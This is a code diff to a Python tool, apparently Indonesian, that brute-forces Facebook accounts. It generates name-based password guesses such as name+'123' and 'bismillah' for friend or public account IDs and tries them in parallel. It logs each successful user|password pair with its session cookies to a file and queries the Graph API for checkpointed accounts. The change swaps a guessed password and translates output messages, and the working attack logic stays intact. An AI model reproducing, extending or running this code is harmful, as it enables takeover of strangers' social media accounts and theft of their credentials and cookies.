@@ -75,7 +75,7 @@ class gas:
         if 'c_user' in d.cookies.get_dict().keys():
             ok+=1
             open('ok','a').write(user+'|'+pw+'\n')
-            print(f'\r\x1b[1;32m[OK]{user}|{pw}|{d.cookies}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;32m[OK] {user}|{pw}|{d.cookies}\x1b[0m\n',end='')
         elif 'checkpoint' in d.cookies.get_dict().keys():
             cp+=1
             r=json.loads(req.get(f'https://graph.facebook.com/{user}?access_token={self.token}').text)
@@ -108,17 +108,17 @@ class gas:
                 print('\nStarting Crack...\n--------------------------------\n')
                 for email in id:
                     uid,name=email.split('|')
-                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','1234']
+                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','bismillah']
                     elif(len(str(name.lower()))<=2):
-                        memek=[name.lower()+'12345','1234']
+                        memek=[name.lower()+'12345','bismillah']
                     elif(len(str(name.lower()))<=3):
-                        memek=[name.lower()+'123',name.lower()+'12345','1234']
+                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
                     else:
-                        memek=[name.lower()+'123',name.lower()+'12345','1234']
+                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
                     try:
                         for pw in memek:kirim.submit(self.crack,uid,pw)
                     except:pass
-        print('\n### [UDAH SELESAI] ###')
+        print('\n### [CRACK FINISHED] ###')
     def get2(self):
         print('\n\t[ Crack ID Teman Atau Publik ]\n')
         target=input('Masukan ID Target: ')
@@ -151,17 +151,17 @@ class gas:
                 print('\nStarting Crack...\n--------------------------------\n')
                 for email in id:
                     uid,name=email.split('|')
-                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','1234']
-                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'12345','1234']
+                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','bismillah']
+                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'12345','bismillah']
                     elif(len(str(name.lower()))<=3):
-                        memek=[name.lower()+'123',name.lower()+'12345','1234']
+                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
                     else:
-                        memek=[name.lower()+'12345','1234']
+                        memek=[name.lower()+'12345','bismillah']
                     try:
                         for pw in memek:
                             kirim.submit(gas(self.token).crack,uid,pw)
                     except:pass
-        print('\n### [UDAH SELESAI] ###')
+        print('\n### [CRACK FINISHED] ###')
     def ua(self):
         print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
         a=input('[?] Ganti useragent y/t: ')
